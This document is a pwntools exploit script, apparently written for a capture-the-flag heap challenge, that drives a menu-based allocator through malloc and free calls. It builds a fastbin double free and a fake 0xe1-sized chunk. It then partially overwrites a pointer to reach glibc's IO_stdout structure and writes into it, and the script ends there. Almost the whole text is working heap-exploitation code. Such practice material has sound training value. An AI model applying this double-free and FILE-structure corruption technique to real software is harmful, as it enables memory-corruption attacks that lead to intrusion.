#!/usr/bin/python3

from pwn import *

exe = ELF('./chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
cnt = -1


def malloc(sz, pa=b'wan'):
    global cnt
    sla(b'[+]> ', b'1')
    sla(b'How much?\n[+]> ', str(sz-1))
    sa(b'Data?\n', pa)
    cnt += 1
    return cnt


def free(idx):
    sla(b'[+]> ', b'2')
    sla(b'[+]> ', str(idx))

# first i use double free -> fake chunk with size 0xe0
a = malloc(0x68)
b = malloc(0x68)
c = malloc(0x68)
malloc(0x68)
free(a)
free(b)
free(a)
malloc(0x68, p8(0xd0))
malloc(0x68, b'\0'*0x8*11 + p64(0x71))
d = malloc(0x68)
malloc(0x68, flat(0, 0xe1))
malloc(0x18)
free(c) # tcache
# second, my malloc (it will be taken from unsorted bin) will include the heap address and I will overwrite 2 bytes 0x95bd (IO_stdout)
# # 0x9600
malloc(0x68, p16(0x95bd))
e = malloc(0x68)
# finally i use DBF and put chunk containing IO address into fastbin
free(e)
free(d)
free(e)
malloc(0x68, p8(0xe0))
malloc(0x68)
malloc(0x68)
malloc(0x68)
GDB()
# IO
malloc(0x68, b'\0'*0x43)

p.interactive()
